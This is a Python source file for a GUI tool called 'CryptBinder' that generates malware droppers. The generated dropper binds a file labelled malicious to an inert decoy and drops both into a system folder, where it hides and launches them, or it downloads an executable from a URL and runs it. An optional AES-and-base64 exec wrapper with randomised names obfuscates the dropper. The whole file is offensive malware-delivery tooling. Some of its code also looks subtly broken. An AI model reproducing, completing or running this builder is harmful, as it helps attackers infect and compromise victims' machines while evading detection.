import base64
import os
import random
import string
from Crypto.Cipher import AES
from hashlib import sha256
import tkinter as tk
from tkinter import filedialog, ttk

def randKey(bytes):
    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for _ in range(bytes))

def randVar():
    return ''.join(random.choice(string.ascii_letters) for _ in range(3)) + "_" + ''.join(
        random.choice("0123456789") for _ in range(3))

def pad(s):
    block_size = 32
    padding = '{'
    return str(s) + (block_size - len(str(s)) % block_size) * padding

def encrypt(c, s):
    return base64.b64encode(c.encrypt(pad(s.encode()))).decode()

def browse_file(entry):
    file_path = filedialog.askopenfilename()
    entry.delete(0, tk.END)
    entry.insert(tk.END, file_path)

def browse_directory(entry):
    directory_path = filedialog.askdirectory()
    entry.delete(0, tk.END)
    entry.insert(tk.END, directory_path)

def generate_dropper():
    mexe = exe_entry.get()
    iexe = inert_entry.get()
    url = url_entry.get()
    var = var_entry.get()
    encrypt_dropper = encrypt_var.get()

    if not mexe or not iexe or not var or (not url and not var):
        error_label.config(text="Please provide all required fields.")
        return

    BLOCK_SIZE = 32
    key = randKey(32)
    cipherEnc = AES.new(key.encode())
    bd64var = randVar()
    AESvar = randVar()

    if encrypt_dropper:
        myendings = [
            'from Crypto.Cipher import AES as {}'.format(AESvar),
            'from base64 import b64decode as {}'.format(bd64var),
            'import os'
        ]
    else:
        myendings = ['import os']

    if mexe or iexe:
        if url:
            error_label.config(text="URL cannot be used with self-contained exes.")
            return
        myendings.append('from hashlib import sha256')

        with open(mexe, 'rb') as exe:
            mexe_content = base64.b64encode(exe.read()).decode()

        with open(iexe, 'rb') as exe:
            iexe_content = base64.b64encode(exe.read()).decode()

        template = '''
pathto = os.getenv("{}")
filename = "{}"
content = "{}"
filename2 = "{}"
content2 = "{}"

fullpath = os.path.join(pathto, filename)
fullpath2 = os.path.join(pathto, filename2)

paths = [[fullpath, content], [fullpath2, content2]]

for p in paths:
    if os.path.isfile(p[0]):
        with open(p[0], 'rb') as f:
            checksum = str(sha256(f.read()).hexdigest())
        origsum = str(sha256({}.b64decode(p[1])).hexdigest())
        if origsum != checksum:
            os.remove(p[0])
            with open(p[0], 'wb') as out:
                out.write({}.b64decode(p[1]))
    else:
        with open(p[0], 'wb') as out:
            out.write({}.b64decode(p[1]))

try:
    os.popen('attrib +h ' + fullpath)
except:
    pass
os.startfile(fullpath)
os.startfile(fullpath2)
'''.format(var, os.path.basename(mexe), mexe_content.replace('\n', ''), os.path.basename(iexe),
           iexe_content.replace('\n', ''), bd64var, bd64var, bd64var)

        encrypted = encrypt(cipherEnc, template)

    elif url:
        if mexe or iexe:
            error_label.config(text="URL cannot be used with self-contained exes.")
            return
        myendings.append('import urllib.request as urllib2')

        template = '''
import urllib.request as urllib2

url = "{}"
down = urllib2.urlopen(url)
filename = url.split('/')[-1]
exe = down.read()
pathto = os.getenv("{}")
fullpath = os.path.join(pathto, filename)
with open(fullpath, 'wb') as f:
    f.write(exe)
os.startfile(fullpath)
'''.format(url, var)

        encrypted = encrypt(cipherEnc, template)

    random.shuffle(myendings)

    dropper_path = 'dropper.py'

    with open(dropper_path, 'w') as drop:
        drop.write(";".join(myendings) + "\n")
        if encrypt_dropper:
            drop.write("exec({}(\"{}\"))".format(bd64var, base64.b64encode(
                "exec({}.new(\"{}\").decrypt({}(\"{}\"))\n".format(AESvar, key, bd64var, encrypted)).decode()))
            enctype = 'encrypted '
        else:
            drop.write(template)

    success_label.config(text="{}dropper written to {}".format(enctype, dropper_path))


# Create the main window
window = tk.Tk()
window.title("CryptBinder")
window.geometry("400x350")

# Create and place the input fields and labels
style = ttk.Style()
style.configure("TLabel", padding=(0, 5, 0, 5))

exe_label = ttk.Label(window, text="Malicious exe/bat/vbs:")
exe_label.pack(fill=tk.X)
exe_entry = ttk.Entry(window)
exe_entry.pack(fill=tk.X)

inert_label = ttk.Label(window, text="Inert exe/bat/vbs:")
inert_label.pack(fill=tk.X)
inert_entry = ttk.Entry(window)
inert_entry.pack(fill=tk.X)

url_label = ttk.Label(window, text="URL:")
url_label.pack(fill=tk.X)
url_entry = ttk.Entry(window)
url_entry.pack(fill=tk.X)

var_label = ttk.Label(window, text="System variable (e.g., TEMP):")
var_label.pack(fill=tk.X)
var_entry = ttk.Entry(window)
var_entry.pack(fill=tk.X)

encrypt_var = tk.BooleanVar()
encrypt_checkbutton = ttk.Checkbutton(window, text="Encrypt dropper", variable=encrypt_var)
encrypt_checkbutton.pack(fill=tk.X)

error_label = ttk.Label(window, fg="red")
error_label.pack(fill=tk.X)

success_label = ttk.Label(window, fg="green")
success_label.pack(fill=tk.X)

# Create the browse button
browse_button = ttk.Button(window, text="Browse", command=lambda: browse_file(exe_entry))
browse_button.pack(fill=tk.X)

# Create the generate dropper button
generate_button = ttk.Button(window, text="Generate Dropper", command=generate_dropper)
generate_button.pack(fill=tk.X)

# Start the main GUI loop
window.mainloop()
